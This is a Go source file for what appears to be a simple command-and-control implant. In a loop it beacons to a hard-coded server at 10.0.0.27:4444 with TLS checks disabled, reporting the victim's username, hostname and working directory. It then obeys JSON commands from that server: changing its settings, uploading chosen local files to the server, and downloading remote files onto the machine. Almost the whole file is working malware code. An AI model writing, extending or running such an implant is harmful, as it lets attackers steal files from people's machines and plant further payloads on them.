package main

import (
    "net/http"
    "net/url"
    "io"
    "path/filepath"
    "path"
    "io/ioutil"
    "strconv"
    "encoding/json"
    "bytes"
    "mime/multipart"
    "os"
    "fmt"
    "crypto/tls"
    "time"
    "os/user"
)

var SETTINGS map[interface{}]interface{}

func init_settings() {
    SETTINGS = map[interface{}]interface{}{
        "urls":make([]string, 1),
        "attempts":"3",
        "beacon":"10",
        "debug":"true",
    }
    urls := []string{"https://10.0.0.27:4444/index.php?id=1"}
    SETTINGS["urls"] = urls
    SETTINGS["url"] = urls[0]
    /*
    SETTINGS["urls"]=make([]string, 1)
    SETTINGS["urls"]=append(SETTINGS["urls"].([]string), "https://10.0.0.27:4444/index.php?id=1")
    SETTINGS["attemtps"]=3
    SETTINGS["beacon"]=10
    SETTINGS["debug"]=true
    */
}


/*
resp, err := http.Get("http://example.com/")
...
resp, err := http.Post("http://example.com/upload", "image/jpeg", &buf)
...
resp, err := http.PostForm("http://example.com/form",
	url.Values{"key": {"Value"}, "id": {"123"}})
*/


/*

def get_target_info():
    return {
        "usr":getpass.getuser(),
        "hostname":socket.gethostname(),
        "cwd": os.getcwd(),
        "time": time.time()
    }


*/
func ignore(err error){
    if err != nil {
        fmt.Println(err)
    }
}



func postFile(filename string, targetUrl string) error {
    bodyBuf := &bytes.Buffer{}
    bodyWriter := multipart.NewWriter(bodyBuf)

    // this step is very important
    fileWriter, err := bodyWriter.CreateFormFile(filename, filename)
    if err != nil {
        fmt.Println("error writing to buffer")
        return err
    }

    // open file handle
    fh, err := os.Open(filename)
    if err != nil {
        fmt.Println("error opening file")
        return err
    }
    defer fh.Close()

    //iocopy
    _, err = io.Copy(fileWriter, fh)
    if err != nil {
        return err
    }

    contentType := bodyWriter.FormDataContentType()
    bodyWriter.Close()

    resp, err := http.Post(targetUrl, contentType, bodyBuf)
    if err != nil {
        return err
    }
    defer resp.Body.Close()
    resp_body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        return err
    }
    fmt.Println(resp.Status)
    fmt.Println(string(resp_body))
    return nil
}

func downloadFile(filepath string, url string) (err error) {

  // Create the file
  out, err := os.Create(filepath)
  if err != nil  {
    return err
  }
  defer out.Close()

  // Get the data
  resp, err := http.Get(url)
  if err != nil {
    return err
  }
  defer resp.Body.Close()

  // Check server response
  if resp.StatusCode != http.StatusOK {
    return fmt.Errorf("bad status: %s", resp.Status)
  }

  // Writer the body to file
  _, err = io.Copy(out, resp.Body)
  if err != nil  {
    return err
  }

  return nil
}


func get_beacon() url.Values {
    user, err := user.Current()
    ignore(err)
    name, err := os.Hostname()
    ignore(err)
    dir, err := os.Getwd()
    ignore(err)
    var timestamp int32
    timestamp = int32(time.Now().Unix())

    return url.Values{"time": {fmt.Sprint(timestamp)}, "beacon": {"True"}, "hostname":{name}, "usr":{user.Name}, "cwd":{dir}}
}

func get_args(rec []interface{}) []interface {} {

    //rec := nil
    var j_inner []interface{}
    json.Unmarshal([]byte(rec[1].(string)), &j_inner)
    if j_inner != nil {
        fmt.Printf("Unmarshalled (inner): %s\n", j_inner)
        rec[1] = j_inner
    }
    return rec
}

func do_cmd(body []byte) {
    fmt.Println("in do_cmd")
    var j map[string]interface{}
    json.Unmarshal(body, &j)
    fmt.Printf("Unmarshalled: %s\n", j)
   
    for cmd, record := range j {
        fmt.Printf("CMD:%s\nArgs:%s\n", cmd,record)
        if cmd == "set" {
            rec := get_args(record.([]interface{}))
            if rec != nil {
                SETTINGS[rec[0]] = rec[1]
                fmt.Printf("SETTINGS['%s']:%s  (%T)\n", rec[0],rec[1], rec[1])
            }
        } else if cmd == "download" {
            //rec := get_args(record.([]interface{}))
            u, _ := url.Parse(SETTINGS["url"].(string))
            u.Path = "/upload.php"
            fmt.Printf("Rec: %s\n", record)
            postFile(record.([]interface{})[0].(string), u.String())
        } else if cmd == "upload" {
            fmt.Printf("Uploading\n")
            file_url := record.([]interface{})[0].(string)
            u, _ := url.Parse(file_url)
            fmt.Printf("Path: %s", u.Path)
            filename := path.Base(u.Path)
            wd, _ := os.Getwd()
            filename = filepath.Join(wd, filename)

            //rec := get_args(record.([]interface{}))
            fmt.Printf("Rec: %s\n", record)
            downloadFile(filename, file_url)
        } else {
            fmt.Printf("CMD:%s no supported!", cmd)
        }
        
    }
    /* 
    if cmd, ok := j["set"].(map[string]interface{}); ok {
        fmt.Printf("%s\n", cmd)
        for k, v := range cmd {
        }
    } else {
        fmt.Printf("%s had no work\n", j)
    }
    */
}

func atoi(s string) int{
    i, _ := strconv.Atoi(s)
    return i
}

func sleep(sec int){
    time.Sleep(time.Duration(sec)*time.Second)
}

func main() {
    init_settings()
    http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
    for {
        //url = "https://10.0.0.27:4444/index.php"
        //resp, err := http.Get("https://10.0.0.27:4444") 
        b := get_beacon()
        err_count := 0
        attempts:= atoi(SETTINGS["attempts"].(string))
        for err_count <= attempts {
            fmt.Printf("%d attempts remaining\n", attempts - err_count)
            //urls := SETTINGS["urls"].([]string)
            //fmt.Printf("URL: %v\n", urls )
            //fmt.Printf("URL: %s\n", urls[0] )
            //resp, err := http.PostForm((SETTINGS["urls"].([]string))[0], b)
            resp, err := http.PostForm(SETTINGS["url"].(string), b)
            if err != nil {
                fmt.Println(err)
                err_count++
                time.Sleep(time.Second)
            } else {
                fmt.Println("hello world")
                fmt.Println(resp)
                bodyBytes, _ := ioutil.ReadAll(resp.Body)
                fmt.Printf("Body:%s\n", string(bodyBytes))
                do_cmd(bodyBytes)
            }
            break
        }
        sleep(atoi(SETTINGS["beacon"].(string)))
    }
}
